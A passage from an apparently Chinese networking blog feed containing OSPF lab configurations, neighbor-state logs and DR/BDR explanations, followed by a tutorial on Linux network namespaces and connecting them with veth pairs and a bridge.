</span></span><span class="line"><span class="cl">127.255.255.255/32  Direct  0    0           D   127.0.0.1       InLoopBack0
</span></span><span class="line"><span class="cl">255.255.255.255/32  Direct  0    0           D   127.0.0.1       InLoopBack0
</span></span></code></pre></td></tr></table>
</div>
</div><p>配置完成后可以看到对应的报文与状态</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">[R1-ospf-1-area-0.0.0.0]
</span></span><span class="line"><span class="cl">Jan 24 2021 22:12:19-08:00 R1 %%01OSPF/4/NBR_CHANGE_E(l)[0]:Neighbor changes eve
</span></span><span class="line"><span class="cl">nt: neighbor status changed. (ProcessId=256, NeighborAddress=2.0.0.10, NeighborE
</span></span><span class="line"><span class="cl">vent=HelloReceived, NeighborPreviousState=Down, NeighborCurrentState=Init) 
</span></span><span class="line"><span class="cl">[R1-ospf-1-area-0.0.0.0]
</span></span><span class="line"><span class="cl">Jan 24 2021 22:12:19-08:00 R1 %%01OSPF/4/NBR_CHANGE_E(l)[1]:Neighbor changes eve
</span></span><span class="line"><span class="cl">nt: neighbor status changed. (ProcessId=256, NeighborAddress=2.0.0.10, NeighborE
</span></span><span class="line"><span class="cl">vent=2WayReceived, NeighborPreviousState=Init, NeighborCurrentState=ExStart) 
</span></span><span class="line"><span class="cl">[R1-ospf-1-area-0.0.0.0]
</span></span><span class="line"><span class="cl">Jan 24 2021 22:12:19-08:00 R1 %%01OSPF/4/NBR_CHANGE_E(l)[2]:Neighbor changes eve
</span></span><span class="line"><span class="cl">nt: neighbor status changed. (ProcessId=256, NeighborAddress=2.0.0.10, NeighborE
</span></span><span class="line"><span class="cl">vent=NegotiationDone, NeighborPreviousState=ExStart, NeighborCurrentState=Exchan
</span></span><span class="line"><span class="cl">ge) 
</span></span><span class="line"><span class="cl">[R1-ospf-1-area-0.0.0.0]
</span></span><span class="line"><span class="cl">Jan 24 2021 22:12:19-08:00 R1 %%01OSPF/4/NBR_CHANGE_E(l)[3]:Neighbor changes eve
</span></span><span class="line"><span class="cl">nt: neighbor status changed. (ProcessId=256, NeighborAddress=2.0.0.10, NeighborE
</span></span><span class="line"><span class="cl">vent=ExchangeDone, NeighborPreviousState=Exchange, NeighborCurrentState=Loading)
</span></span><span class="line"><span class="cl"> 
</span></span><span class="line"><span class="cl">[R1-ospf-1-area-0.0.0.0]
</span></span><span class="line"><span class="cl">Jan 24 2021 22:12:20-08:00 R1 %%01OSPF/4/NBR_CHANGE_E(l)[4]:Neighbor changes eve
</span></span><span class="line"><span class="cl">nt: neighbor status changed. (ProcessId=256, NeighborAddress=2.0.0.10, NeighborE
</span></span><span class="line"><span class="cl">vent=LoadingDone, NeighborPreviousState=Loading, NeighborCurrentState=Full) 
</span></span><span class="line"><span class="cl">[R1-ospf-1-area-0.0.0.0]
</span></span></code></pre></td></tr></table>
</div>
</div><h2 id="ospf的八种状态">ospf的八种状态</h2>
<p>在OSPF网络中，为了交换路由信息，邻居设备之间首先要建立邻接关系，邻居（Neighbors）关系和邻接（Adjacencies）关系是两个不同的概念。</p>
<p>邻居关系：OSPF设备启动后，会通过OSPF接口向外发送Hello报文，收到Hello报文的OSPF设备会检查报文中所定义的参数，如果双方一致就会形成邻居关系，两端设备互为邻居。</p>
<p>邻接关系：形成邻居关系后，如果两端设备成功交换DD报文和LSA，才建立邻接关系。</p>
<p>OSPF共有8种状态机，分别是：Down、Attempt、Init、2-way、Exstart、Exchange、Loading、Full。</p>
<ul>
<li><strong>Down</strong>：邻居会话的初始阶段，表明没有在邻居失效时间间隔内收到来自邻居路由器的Hello数据包。</li>
<li><strong>Attempt</strong>：该状态仅发生在NBMA网络中，表明对端在邻居失效时间间隔（dead interval）超时前仍然没有回复Hello报文。此时路由器依然每发送轮询Hello报文的时间间隔（poll interval）向对端发送Hello报文。</li>
<li><strong>Init</strong>：收到Hello报文后状态为Init。</li>
<li><strong>2-way</strong>：收到的Hello报文中包含有自己的Router ID，则状态为2-way；如果不需要形成邻接关系则邻居状态机就停留在此状态，否则进入Exstart状态。</li>
<li><strong>Exstart</strong>：开始协商主从关系，并确定DD的序列号，此时状态为Exstart。</li>
<li><strong>Exchange</strong>：主从关系协商完毕后开始交换DD报文，此时状态为Exchange。</li>
<li><strong>Loading</strong>：DD报文交换完成即Exchange done，此时状态为Loading。</li>
<li><strong>Full</strong>：LSR重传列表为空，此时状态为Full</li>
</ul>
<h2 id="实验-多播网络ospf关系">实验 多播网络ospf关系</h2>
<p>在广播多路访问网络（Multi Access）中，所有的路由器的接口都是相同网段，这些接口两两建立OSPF邻居关系，这就意味着，网络中共有：<code>n(n-1)/2</code>。维护如此多的邻居关系不仅额外消耗资源，更增加了网络中LSA的泛洪数量。</p>
<p>为减小多路访问网络中的 OSPF 流量，OSPF 会在每一个MA网络（多路访问网络）选举一个指定路由器 (DR)和一个备用指定路由器 (BDR)。</p>
<p>DR选举规则：最高OSPF接口优先级拥有者被选作DR，如果优先级相等（默认为1），具有最高的OSPF Router-ID的路由器被选举成DR，并且DR具有非抢占性。</p>
<p>指定路由器 (DR)：DR 负责使用该变化信息更新其它所有 OSPF 路由器（DR Rother）。备用指定路由器 (BDR)：BDR 会监控 DR 的状态，并在当前 DR 发生故障时接替其角色。 注意OSPF为“接口敏感型协议”，DR及BDR的身份状态是基于OSPF接口的。</p>
<p>MA网络中，所有的DRother路由器均只与DR和BDR建立邻接关系，DRother间不建立全毗邻邻接关系。如此一来，该多路访问网络中设备需要维护的OSPF邻居关系大幅减小：M= (n-2)×2+1，LSA的泛洪问题也可以得到一定的缓解。</p>
<p>
  <img loading="lazy" src="https://cdn.jsdelivr.net/gh/CylonChau/imgbed/img/image-20210125203616619.png" alt="image-20210125203616619"  /></p>
<p>可以查看到对应两种状态的ospf中的角色</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span><span class="lnt">46
</span><span class="lnt">47
</span><span class="lnt">48
</span><span class="lnt">49
</span><span class="lnt">50
</span><span class="lnt">51
</span><span class="lnt">52
</span><span class="lnt">53
</span><span class="lnt">54
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="o">[</span>R3<span class="o">]</span>dis ospf peer brief
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">	 OSPF Process <span class="m">1</span> with Router ID 10.10.10.10
</span></span><span class="line"><span class="cl">		  Peer Statistic Information
</span></span><span class="line"><span class="cl"> ----------------------------------------------------------------------------
</span></span><span class="line"><span class="cl"> Area Id          Interface                        Neighbor id      State    
</span></span><span class="line"><span class="cl"> 0.0.0.0          GigabitEthernet0/0/0             30.30.30.30      Full        
</span></span><span class="line"><span class="cl"> 0.0.0.0          GigabitEthernet0/0/0             5.5.5.5          Full        
</span></span><span class="line"><span class="cl"> 0.0.0.0          GigabitEthernet0/0/0             6.6.6.6          Full        
</span></span><span class="line"><span class="cl"> 0.0.0.0          GigabitEthernet0/0/0             7.7.7.7          Full        
</span></span><span class="line"><span class="cl"> ----------------------------------------------------------------------------
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="o">[</span>R7-ospf-1-area-0.0.0.0<span class="o">]</span>dis ospf peer brief 
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">	 OSPF Process <span class="m">1</span> with Router ID 7.7.7.7
</span></span><span class="line"><span class="cl">		  Peer Statistic Information
</span></span><span class="line"><span class="cl"> ----------------------------------------------------------------------------
</span></span><span class="line"><span class="cl"> Area Id          Interface                        Neighbor id      State    
</span></span><span class="line"><span class="cl"> 0.0.0.0          GigabitEthernet0/0/0             10.10.10.10      Full        
</span></span><span class="line"><span class="cl"> 0.0.0.0          GigabitEthernet0/0/0             30.30.30.30      Full        
</span></span><span class="line"><span class="cl"> 0.0.0.0          GigabitEthernet0/0/0             5.5.5.5          2-Way       
</span></span><span class="line"><span class="cl"> 0.0.0.0          GigabitEthernet0/0/0             6.6.6.6          2-Way       
</span></span><span class="line"><span class="cl"> ----------------------------------------------------------------------------
</span></span><span class="line"><span class="cl"> 
</span></span><span class="line"><span class="cl"> <span class="c1"># 除了dr 与 bdr 任何机器值只与dr和bdr形成关系</span>
</span></span><span class="line"><span class="cl"> <span class="o">[</span>R3<span class="o">]</span>dis ospf peer 
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">	 OSPF Process <span class="m">1</span> with Router ID 10.10.10.10
</span></span><span class="line"><span class="cl">		 Neighbors 
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"> Area 0.0.0.0 interface 192.168.0.10<span class="o">(</span>GigabitEthernet0/0/0<span class="o">)</span><span class="err">&#39;</span>s neighbors
</span></span><span class="line"><span class="cl"> Router ID: 30.30.30.30      Address: 192.168.0.11    
</span></span><span class="line"><span class="cl">   State: Full  Mode:Nbr is  Master  Priority: <span class="m">1</span>
</span></span><span class="line"><span class="cl">   DR: 192.168.0.10  BDR: 192.168.0.11  MTU: <span class="m">0</span>    
</span></span><span class="line"><span class="cl">   Dead timer due in <span class="m">40</span>  sec 
</span></span><span class="line"><span class="cl">   Retrans timer interval: <span class="m">5</span> 
</span></span><span class="line"><span class="cl">   Neighbor is up <span class="k">for</span> 00:57:22     
</span></span><span class="line"><span class="cl">   Authentication Sequence: <span class="o">[</span> <span class="m">0</span> <span class="o">]</span> 
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"> Router ID: 5.5.5.5          Address: 192.168.0.12    
</span></span><span class="line"><span class="cl">   State: Full  Mode:Nbr is  Slave  Priority: <span class="m">1</span>
</span></span><span class="line"><span class="cl">   DR: 192.168.0.10  BDR: 192.168.0.11  MTU: <span class="m">0</span>    
</span></span><span class="line"><span class="cl">   Dead timer due in <span class="m">40</span>  sec 
</span></span><span class="line"><span class="cl">   Retrans timer interval: <span class="m">5</span> 
</span></span><span class="line"><span class="cl">   Neighbor is up <span class="k">for</span> 00:56:31     
</span></span><span class="line"><span class="cl">   Authentication Sequence: <span class="o">[</span> <span class="m">0</span> <span class="o">]</span> 
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"> Router ID: 6.6.6.6          Address: 192.168.0.13    
</span></span><span class="line"><span class="cl">   State: Full  Mode:Nbr is  Slave  Priority: <span class="m">1</span>
</span></span><span class="line"><span class="cl">   DR: 192.168.0.10  BDR: 192.168.0.11  MTU: <span class="m">0</span>    
</span></span><span class="line"><span class="cl">   Dead timer due in <span class="m">40</span>  sec 
</span></span><span class="line"><span class="cl">   Retrans timer interval: <span class="m">5</span> 
</span></span><span class="line"><span class="cl">   Neighbor is up <span class="k">for</span> 00:56:08     
</span></span><span class="line"><span class="cl">   Authentication Sequence: <span class="o">[</span> <span class="m">0</span> <span class="o">]</span>
</span></span></code></pre></td></tr></table>
</div>
</div><h2 id="实验多区域ospf">实验：多区域ospf</h2>
<p>
  <img loading="lazy" src="https://cdn.jsdelivr.net/gh/CylonChau/imgbed/img/image-20210125221613058.png" alt="image-20210125221613058"  /></p>
<p>对两个区域的路由器设置对应的配置</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">system-view 
</span></span><span class="line"><span class="cl">sysname R10
</span></span><span class="line"><span class="cl">ip address 10.0.0.1 <span class="m">24</span>
</span></span><span class="line"><span class="cl">in l0
</span></span><span class="line"><span class="cl">ip address 1.1.1.1 <span class="m">32</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">ospf router-id 4.4.4.4
</span></span><span class="line"><span class="cl">area <span class="m">0</span>
</span></span><span class="line"><span class="cl">network 0.0.0.0 255.255.255.255
</span></span><span class="line"><span class="cl"><span class="o">[</span>R10<span class="o">]</span>dis ospf peer brief 
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">	 OSPF Process <span class="m">1</span> with Router ID 4.4.4.4
</span></span><span class="line"><span class="cl">		  Peer Statistic Information
</span></span><span class="line"><span class="cl"> ----------------------------------------------------------------------------
</span></span><span class="line"><span class="cl"> Area Id          Interface                        Neighbor id      State    
</span></span><span class="line"><span class="cl"> 0.0.0.0          GigabitEthernet0/0/0             5.5.5.5          Full        
</span></span><span class="line"><span class="cl"> ----------------------------------------------------------------------------
</span></span></code></pre></td></tr></table>
</div>
</div><p>对边界路由设置双区域</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">system-view 
</span></span><span class="line"><span class="cl">sysname R11
</span></span><span class="line"><span class="cl">ip address 10.0.0.2 <span class="m">24</span>
</span></span><span class="line"><span class="cl">in l0
</span></span><span class="line"><span class="cl">ip address 2.2.2.2 <span class="m">32</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">interface g0/0/1
</span></span><span class="line"><span class="cl">ip address 10.1.0.1 255.255.255.0 
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">ospf router-id 5.5.5.5
</span></span><span class="line"><span class="cl">area <span class="m">0</span>
</span></span><span class="line"><span class="cl">network 10.0.0.0 0.0.0.255
</span></span><span class="line"><span class="cl">network 2.2.2.2 0.0.0.0
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">area <span class="m">1</span>
</span></span><span class="line"><span class="cl">network 10.1.0.0 0.0.0.255
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="o">[</span>R11-ospf-1-area-0.0.0.1<span class="o">]</span>dis ospf peer brief 
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">	 OSPF Process <span class="m">1</span> with Router ID 5.5.5.5
</span></span><span class="line"><span class="cl">		  Peer Statistic Information
</span></span><span class="line"><span class="cl"> ----------------------------------------------------------------------------
</span></span><span class="line"><span class="cl"> Area Id          Interface                        Neighbor id      State    
</span></span><span class="line"><span class="cl"> 0.0.0.0          GigabitEthernet0/0/0             4.4.4.4          Full        
</span></span><span class="line"><span class="cl"> 0.0.0.1          GigabitEthernet0/0/1             3.3.3.3          Full        
</span></span><span class="line"><span class="cl"> ----------------------------------------------------------------------------
</span></span></code></pre></td></tr></table>
</div>
</div><p>可以看到已经学习到对应的路由了</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="o">[</span>R10<span class="o">]</span>dis ip routing-table 
</span></span><span class="line"><span class="cl">Route Flags: R - relay, D - download to fib
</span></span><span class="line"><span class="cl">------------------------------------------------------------------------------
</span></span><span class="line"><span class="cl">Routing Tables: Public
</span></span><span class="line"><span class="cl">         Destinations : <span class="m">11</span>       Routes : <span class="m">11</span>       
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Destination/Mask    Proto   Pre  Cost      Flags NextHop         Interface
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        1.1.1.1/32  Direct  <span class="m">0</span>    <span class="m">0</span>           D   127.0.0.1       LoopBack0
</span></span><span class="line"><span class="cl">        2.2.2.2/32  OSPF    <span class="m">10</span>   <span class="m">1</span>           D   10.0.0.2        GigabitEthernet
</span></span><span class="line"><span class="cl">0/0/0
</span></span><span class="line"><span class="cl">        3.3.3.3/32  OSPF    <span class="m">10</span>   <span class="m">2</span>           D   10.0.0.2        GigabitEthernet
</span></span><span class="line"><span class="cl">0/0/0
</span></span><span class="line"><span class="cl">       10.0.0.0/24  Direct  <span class="m">0</span>    <span class="m">0</span>           D   10.0.0.1        GigabitEthernet
</span></span><span class="line"><span class="cl">0/0/0
</span></span><span class="line"><span class="cl">       10.0.0.1/32  Direct  <span class="m">0</span>    <span class="m">0</span>           D   127.0.0.1       GigabitEthernet
</span></span><span class="line"><span class="cl">0/0/0
</span></span><span class="line"><span class="cl">     10.0.0.255/32  Direct  <span class="m">0</span>    <span class="m">0</span>           D   127.0.0.1       GigabitEthernet
</span></span><span class="line"><span class="cl">0/0/0
</span></span><span class="line"><span class="cl">       10.1.0.0/24  OSPF    <span class="m">10</span>   <span class="m">2</span>           D   10.0.0.2        GigabitEthernet
</span></span><span class="line"><span class="cl">0/0/0
</span></span><span class="line"><span class="cl">      127.0.0.0/8   Direct  <span class="m">0</span>    <span class="m">0</span>           D   127.0.0.1       InLoopBack0
</span></span><span class="line"><span class="cl">      127.0.0.1/32  Direct  <span class="m">0</span>    <span class="m">0</span>           D   127.0.0.1       InLoopBack0
</span></span><span class="line"><span class="cl">127.255.255.255/32  Direct  <span class="m">0</span>    <span class="m">0</span>           D   127.0.0.1       InLoopBack0
</span></span><span class="line"><span class="cl">255.255.255.255/32  Direct  <span class="m">0</span>    <span class="m">0</span>           D   127.0.0.1       InLoopBack0
</span></span></code></pre></td></tr></table>
</div>
</div><p>[ospf-test.zip](......\images\Dynamic Routing - OSPF\ospf-test.zip)</p>
]]></content:encoded>
    </item>
    
    <item>
      <title>网络名称空间</title>
      <link>https://www.oomkill.com/2021/01/netspace/</link>
      <pubDate>Sat, 02 Jan 2021 00:00:00 +0000</pubDate>
      
      <guid>https://www.oomkill.com/2021/01/netspace/</guid>
      <description></description>
      <content:encoded><![CDATA[<h2 id="linux-namespace">linux namespace</h2>
<p><strong>namespace</strong>是Linux内核的一项功能，该功能对内核资源进行分区，以使一组<a href="https://en.wikipedia.org/wiki/Process_(computing)">进程</a>看到一组资源，而另一组进程看到另一组资源。该功能通过为一组资源和进程具有相同的名称空间而起作用，但是这些名称空间引用了不同的资源。资源可能存在于多个空间中。</p>
<p>Linux namespaces 是对全局系统资源的一种封装隔离，使得处于不同 namespace 的进程拥有独立的全局系统资源，改变一个namespace中的系统资源只会影响当前 namespace 里的进程，对其他 namespace 中的进程没有影响。</p>
<p>每一个进程在其对应的 <code>/proc/[pid]/ns</code> 下都有其 namespace 信息</p>
<p>查看当前进程的namespace <code>ll /proc/$$/ns</code></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">cgroup -&gt; cgroup:<span class="o">[</span>4026531835<span class="o">]</span> cgroup的根目录
</span></span><span class="line"><span class="cl">ipc -&gt; ipc:<span class="o">[</span>4026531839<span class="o">]</span> 信号量
</span></span><span class="line"><span class="cl">mnt -&gt; mnt:<span class="o">[</span>4026531840<span class="o">]</span> 文件系统挂载点
</span></span><span class="line"><span class="cl">net -&gt; net:<span class="o">[</span>4026531992<span class="o">]</span> 网络设备、网络栈、端口
</span></span><span class="line"><span class="cl">pid -&gt; pid:<span class="o">[</span>4026531836<span class="o">]</span> 进程编号
</span></span><span class="line"><span class="cl">pid_for_children -&gt; pid:<span class="o">[</span>4026531836<span class="o">]</span>
</span></span><span class="line"><span class="cl"><span class="nb">time</span> -&gt; time:<span class="o">[</span>4026531834<span class="o">]</span>
</span></span><span class="line"><span class="cl">time_for_children -&gt; time:<span class="o">[</span>4026531834<span class="o">]</span>
</span></span><span class="line"><span class="cl">user -&gt; user:<span class="o">[</span>4026531837<span class="o">]</span> 用户和用户组
</span></span><span class="line"><span class="cl">uts -&gt; uts:<span class="o">[</span>4026531838<span class="o">]</span> 主机名和NIS域名
</span></span></code></pre></td></tr></table>
</div>
</div><h2 id="linux的网络名称空间">linux的网络名称空间</h2>
<p>linux network namespace 是network namespace 是 linux 内核提供的功能，在实现网络虚拟化中起重要作用，每个网络名称空间中有独立的网络协议栈，如路由表、iptables、端口等。在network namespace可以创建多个隔离的网络空间，它们有独自的网络栈信息。在运行的时候仿佛自己就在独立的网络中。</p>
<h3 id="linux网络管理命令ip">linux网络管理命令ip</h3>
<p>ip命令是Linux管理网络的工具，他对路由、地址、链路、namespace等的管理。</p>
<p>ip命令的使用说明：</p>
<ul>
<li>
<p><code>ip netns list</code> 查看网络命名空间</p>
</li>
<li>
<p><code>ip netns add net2</code> 创建一个网络命名空间</p>
</li>
<li>
<p><code>ip link add $name link eth0 type ipvlan mode l2</code> 在当前名称空间创建一个类型为ipvlan l2模式的接口，将该接口关联至父接口eth0上。</p>
</li>
<li>
<p><code>ip link set $name netns $nsName</code> 将接口加入到对应网络名称空间内</p>
</li>
<li>
<p><code>ip netns exec $nsName $cmd</code>  在对应的网络名称空间内运行命令</p>
</li>
<li>
<p><code>ip link add $p1-name type veth peer name $p2-name</code> 创建一个网卡对</p>
</li>
<li>
<p><code>ethtool -S $interface_name</code> 查看网卡对对应关系，通过index获得另外一端</p>
</li>
</ul>
<h2 id="虚拟以太网对-veth-pair">虚拟以太网对 VETH Pair</h2>
<p>VETH virtual-ethernet 虚拟以太网对，是网络交换机中的虚拟接口，在linux名称空间中，vEth可以充当名称空间之间的隧道，通过建立一个网桥链接到另一个名称空间中的物理设备，所有设备始终以互连对的形式创建。</p>
<p>
  <img loading="lazy" src="https://cdn.jsdelivr.net/gh/CylonChau/imgbed/img/image-20221025174025232.png" alt="image-20221025174025232"  /></p>
<h3 id="实验使在不同网络名称空间下的veth互通">实验：使在不同网络名称空间下的vEth互通</h3>
<p>实验实现：创建两个名称空间<code>net1</code>和<code>net2</code>，以及一对VETH设备，并将其分配<code>veth1</code>给namespace<code>net1</code> 和<code>veth2</code>namespace <code>net2</code>。这两个名称空间与此VETH对相连。分配一对IP地址，使两个名称空间之间ping通。</p>
<p>开启linuxip转发功能</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">echo 1 &gt; /proc/sys/net/ipv4/ip_forward
</span></span></code></pre></td></tr></table>
</div>
</div><p>创建两个名称空间</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">ip netns add net1
</span></span><span class="line"><span class="cl">ip netns add net2
</span></span></code></pre></td></tr></table>
</div>
</div><p>创建两个虚拟网卡对</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">ip link a veth0 type veth peer name br-veth0
</span></span><span class="line"><span class="cl">ip link a veth1 type veth peer name br-veth1
</span></span></code></pre></td></tr></table>
</div>
</div><p>创建一个网桥</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">ip link add bridge1 type bridge
</span></span><span class="line"><span class="cl"># 启动设备
</span></span><span class="line"><span class="cl">ip link set bridge1 up
</span></span></code></pre></td></tr></table>
</div>
</div><p>将虚拟网卡对的一段链接至网桥上</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">ip link set br-veth0 master bridge1
</span></span><span class="line"><span class="cl">ip link set br-veth1 master bridge1
</span></span><span class="line"><span class="cl"> 
</span></span><span class="line"><span class="cl">ip link set br-veth1 up
</span></span><span class="line"><span class="cl">ip link set br-veth0 up
</span></span></code></pre></td></tr></table>
</div>
</div><p>虚拟网桥另外一端关联至对应名称空间内</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">ip link set veth0 netns net1
</span></span><span class="line"><span class="cl">ip link set veth1 netns net2
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">ip netns exec net1 ip addr add 192.168.0.1/24 dev veth0
</span></span><span class="line"><span class="cl">ip netns exec net2 ip addr add 192.168.0.2/24 dev veth1
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">ip netns exec net1 ip link set veth0 up
</span></span><span class="line"><span class="cl">ip netns exec net2 ip link set veth1 up
</span></span></code></pre></td></tr></table>
</div>
</div><p>此时可以通过网桥对这两个网络进行互相ping通，不同网段的需要手动添加相应的路由表规则。而ping自己的地址不通，原因是因为lo设备未启动。</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">ip netns exec net2 ip link set lo up
